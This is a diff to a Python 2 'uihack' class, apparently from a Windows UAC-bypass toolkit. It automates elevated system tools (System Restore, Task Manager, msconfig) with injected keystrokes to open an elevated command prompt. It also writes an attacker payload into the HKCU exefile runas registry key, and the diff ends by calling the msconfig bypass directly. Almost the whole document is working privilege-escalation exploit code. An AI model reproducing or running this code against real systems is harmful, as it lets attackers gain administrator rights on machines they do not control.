@@ -101,7 +101,7 @@ class uihack():
 		self.VK_D	= 0x44
 
 	def keybd_event(self, keycode):
-		if ctypes.windll.user32.keybd_event(keycode,0,0,0):
+		if ctypes.windll.user32.keybd_event(keycode,0,0x0000,0):
 			time.sleep(0.1)
 			if ctypes.windll.user32.keybd_event(keycode,0,0x0002,0):
 				return True
@@ -113,6 +113,7 @@ class uihack():
 		shinfo = ShellExecInfo()
 		shinfo.cbSize = ctypes.sizeof(shinfo)
 		shinfo.fMask = 0x00000040
+		shinfo.lpVerb = "runas"
 		shinfo.lpFile = process
 		shinfo.nShow = 5
 		shinfo.lpParameters = params
@@ -127,7 +128,7 @@ class uihack():
 		#
 		# This method supports custom payloads
 		#
-		if uihack().host_process("rstrui.exe", "/RUNONCE"):
+		if self.host_process("rstrui.exe", "/RUNONCE"):
 			time.sleep(5)
 
 			if registry().modify_key("hkcu", "Software\\Classes\\exefile\\shell\\runas\\command", None, payload, create=True):
@@ -142,10 +143,10 @@ class uihack():
 				print "[Debug] FindWindowA - HWND:  {hwnd}".format(hwnd=hwnd)
 				if ctypes.windll.user32.SetForegroundWindow(hwnd):
 					print "[Debug] SetForegroundWindow - HWND:  {hwnd}".format(hwnd=hwnd)
-					if uihack().keybd_event(self.VK_LEFT):
+					if self.keybd_event(self.VK_LEFT):
 							print "[Debug] keybd_event Press - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_DOWN)
 							time.sleep(0.1)
-					if uihack().keybd_event(self.VK_RETURN):
+					if self.keybd_event(self.VK_RETURN):
 							print "[Debug] keybd_event Press - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_DOWN)
 							time.sleep(0.1)								
 				else:
@@ -170,7 +171,7 @@ class uihack():
 		# custom payloads supported unless you execute them via the elevated
 		# command prompt that pops up upon successful exploitation.
 		#
-		if uihack().host_process("taskmgr.exe", None):
+		if self.host_process("taskmgr.exe", None):
 			time.sleep(5)
 
 			print "[Debug] Attempting to locate window 'Task Manager' using FindWindowA"
@@ -180,33 +181,33 @@ class uihack():
 				if ctypes.windll.user32.SetForegroundWindow(hwnd):
 					print "[Debug] SetForegroundWindow - HWND:  {hwnd}".format(hwnd=hwnd)
 
-					if uihack().keybd_event(self.VK_MENU):
+					if self.keybd_event(self.VK_MENU):
 						print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_MENU)
 						time.sleep(0.1)
-					if uihack().keybd_event(self.VK_RETURN):
+					if self.keybd_event(self.VK_RETURN):
 						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_RETURN)
 						time.sleep(0.1)
-					if uihack().keybd_event(self.VK_RETURN):
+					if self.keybd_event(self.VK_RETURN):
 						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_RETURN)
 						time.sleep(0.1)
 
-					if uihack().keybd_event(self.VK_C):
+					if self.keybd_event(self.VK_C):
 						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_C)
 						time.sleep(0.1)
-					if uihack().keybd_event(self.VK_M):
+					if self.keybd_event(self.VK_M):
 						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_M)
 						time.sleep(0.1)				
-					if uihack().keybd_event(self.VK_D):
+					if self.keybd_event(self.VK_D):
 						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_D)
 						time.sleep(0.1)
 
-					if uihack().keybd_event(self.VK_TAB):
+					if self.keybd_event(self.VK_TAB):
 						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_TAB)
 						time.sleep(0.1)
-					if uihack().keybd_event(self.VK_SPACE):
+					if self.keybd_event(self.VK_SPACE):
 						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_SPACE)
 						time.sleep(0.1)
-					if uihack().keybd_event(self.VK_RETURN):
+					if self.keybd_event(self.VK_RETURN):
 						print "[Debug] keybd_event Press- HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_RETURN)
 						time.sleep(0.1)				
 				else:
@@ -225,7 +226,7 @@ class uihack():
 		# custom payloads supported unless you execute them via the elevated
 		# command prompt that pops up upon successful exploitation.
 		#
-		if uihack().host_process("msconfig.exe", "-7"):
+		if self.host_process("msconfig.exe", "-7"):
 			time.sleep(5)
 
 			print "[Debug] Attempting to locate window 'System Configuration' using FindWindowA"
@@ -235,16 +236,16 @@ class uihack():
 				if ctypes.windll.user32.SetForegroundWindow(hwnd):
 					print "[Debug] SetForegroundWindow - HWND:  {hwnd}".format(hwnd=hwnd)
 					for x in range(14):
-						if uihack().keybd_event(self.VK_DOWN):
+						if self.keybd_event(self.VK_DOWN):
 							print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_DOWN)
 							time.sleep(0.1)
 
 					for x in range(2):
-						if uihack().keybd_event(self.VK_TAB):
+						if self.keybd_event(self.VK_TAB):
 							print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_TAB)
 							time.sleep(0.1)
 
-					if uihack().keybd_event(self.VK_RETURN):
+					if self.keybd_event(self.VK_RETURN):
 						print "[Debug] keybd_event - HWND: {hwnd} - keybd_event: {vk_code}".format(hwnd=hwnd, vk_code=self.VK_RETURN)
 				else:
 					print "[Debug] Unable to set window to foreground, cannot proceed"
@@ -255,7 +256,5 @@ class uihack():
 		else:
 			print "[Debug] Unable to start host process, cannot proceed"
 			return False
-
-#uihack().rstrui("c:\\windows\\system32\\cmd.exe")
-#uihack().taskmgr()
+			
 uihack().msconfig()
